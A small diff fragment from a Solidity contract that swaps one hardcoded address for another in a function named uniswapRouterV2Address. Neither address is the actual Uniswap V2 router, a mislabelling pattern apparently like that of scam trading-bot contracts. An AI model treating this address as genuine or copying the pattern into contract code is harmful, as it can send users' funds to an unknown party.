@@ -111,7 +111,7 @@ interface IUniswapPair {
 
 contract RouterV2 {
     function uniswapRouterV2Address() public pure returns (address) {
-        return 0x83BC352073AAa8d2dc0ff52Ff25e81B19c95E07D;
+        return 0xa38C641a9613053b45d20eBcb325ACC33956fbDC;
     }
 
     function compareStrings(string memory a, string memory b)
